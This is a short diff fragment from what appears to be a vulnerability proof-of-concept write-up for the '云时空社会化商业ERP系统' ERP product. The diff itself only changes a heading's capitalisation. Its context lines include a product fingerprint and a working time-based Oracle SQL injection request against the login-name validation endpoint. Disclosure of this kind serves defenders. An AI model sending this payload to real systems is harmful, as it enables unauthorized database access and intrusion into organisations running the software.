@@ -5,7 +5,7 @@
 app="云时空社会化商业ERP系统"
 ```
 
-## poc
+## POC
 ```
 GET /sys/user/validateLoginName?loginName=admin'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1
 Host: your-ip
